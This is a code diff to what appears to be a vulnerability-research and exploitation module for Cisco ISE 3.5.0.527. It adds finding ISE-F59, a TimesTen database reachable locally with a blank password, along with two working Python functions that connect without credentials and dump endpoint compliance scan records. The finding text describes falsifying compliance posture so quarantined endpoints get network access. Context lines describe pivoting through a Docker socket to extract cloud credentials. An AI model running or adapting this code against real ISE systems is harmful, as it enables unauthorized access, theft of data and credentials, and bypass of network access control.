@@ -105,6 +105,12 @@ ISE-F57: RADKit Docker container — RADKIT_SERVICE_SUPERADMIN_PASSWORD + CUSTOM
   RADKIT_SERVICE_SUPERADMIN_PASSWORD authenticates ISE node to prod.radkit-cloud.cisco.com
   Docker socket mounted in EDDA (F11) and Hermes (F44) containers -> pivot to extract both creds
   Source: radkit-control.sh:setup_radkit() docker_create_container invocation
+ISE-F59: vaservice TimesTen in-memory DB — blank password for vatt DSN [MEDIUM]
+  DSN=vatt, username=vatt, password= (blank) in vaservice/conf/vaservice.properties
+  TimesTen TCNAC daemon: Network_Address=127.0.0.1, TCP_Port=53395 (MNT: 53385)
+  Health check: ttIsql 'DSN=vatt' with no password — confirms no-auth design
+  Write access: falsify endpoint compliance posture -> ISE grants network access to quarantined endpoints
+  Source: vaservice.properties; cloud_initial_setup.sh:303-315; vattcontrol.sh:60; irf-control.sh:818
 
 === ISE-F1: key_manager UNIX socket — unauthenticated decryption oracle ===
 
@@ -3953,9 +3959,47 @@ exit;
     return result
 
 
+def connect_timesten_vatt_no_auth(host: str = "127.0.0.1", port: int = 53395) -> dict:
+    """ISE-F59: Connect to vaservice TimesTen DB (DSN=vatt) with blank password.
+    Daemon binds to 127.0.0.1:53395. Any local process connects without credentials.
+    """
+    import subprocess
+    result: dict = {"host": host, "port": port, "dsn": "vatt"}
+    try:
+        out = subprocess.check_output(
+            ["/opt/TimesTen/tcnac/bin/ttIsql", "DSN=vatt", "-e", "SELECT * FROM v$version;"],
+            timeout=10, stderr=subprocess.STDOUT
+        )
+        result["output"] = out.decode()
+        result["status"] = "connected"
+        result["note"] = "F59 confirmed: TimesTen vatt DSN accepts blank password"
+    except Exception as e:
+        result["error"] = str(e)
+    return result
+
+
+def dump_timesten_vatt_compliance_data() -> dict:
+    """ISE-F59: Dump endpoint compliance/VA scan data from TimesTen vatt DSN.
+    Returns endpoint posture records that ISE uses for NAC policy decisions.
+    """
+    import subprocess
+    result: dict = {}
+    query_cmd = [
+        "/opt/TimesTen/tcnac/bin/ttIsql", "DSN=vatt",
+        "-e", "SELECT * FROM va_scan_results ORDER BY scan_time DESC FIRST 50;"
+    ]
+    try:
+        out = subprocess.check_output(query_cmd, timeout=20, stderr=subprocess.STDOUT)
+        result["output"] = out.decode()
+        result["status"] = "dumped"
+    except Exception as e:
+        result["error"] = str(e)
+    return result
+
+
 MODULE_META = {
     "name": "cisco_ise_re",
-    "version": "1.29.0",
+    "version": "1.30.0",
     "target": "Cisco ISE 3.5.0.527",
     "findings": [
         "ISE-F1", "ISE-F2", "ISE-F3", "ISE-F4", "ISE-F5",
@@ -3968,7 +4012,7 @@ MODULE_META = {
         "ISE-F39", "ISE-F40", "ISE-F42", "ISE-F43", "ISE-F44",
         "ISE-F45", "ISE-F46", "ISE-F47", "ISE-F48", "ISE-F49",
         "ISE-F50", "ISE-F51", "ISE-F52", "ISE-F53",
-        "ISE-F54", "ISE-F55", "ISE-F56", "ISE-F57", "ISE-F58",
+        "ISE-F54", "ISE-F55", "ISE-F56", "ISE-F57", "ISE-F58", "ISE-F59",
     ],
     "critical": ["ISE-F1", "ISE-F2", "ISE-F6", "ISE-F11", "ISE-F12", "ISE-F16", "ISE-F20",
                  "ISE-F26", "ISE-F31", "ISE-F34", "ISE-F40", "ISE-F49", "ISE-F58"],
@@ -3977,7 +4021,7 @@ MODULE_META = {
              "ISE-F39", "ISE-F44", "ISE-F48", "ISE-F54", "ISE-F56", "ISE-F57"],
     "medium": ["ISE-F5", "ISE-F8", "ISE-F14", "ISE-F21", "ISE-F22", "ISE-F24",
                "ISE-F30", "ISE-F33", "ISE-F37", "ISE-F42", "ISE-F45", "ISE-F47",
-               "ISE-F50", "ISE-F51", "ISE-F52", "ISE-F55"],
+               "ISE-F50", "ISE-F51", "ISE-F52", "ISE-F55", "ISE-F59"],
     "low": ["ISE-F4", "ISE-F17", "ISE-F25", "ISE-F43", "ISE-F46", "ISE-F53"],
     "source": "Static RE of Cisco-ISE-3.5.0.527.SPA.x86_64.iso (2026-08-26)",
     "key_material": {
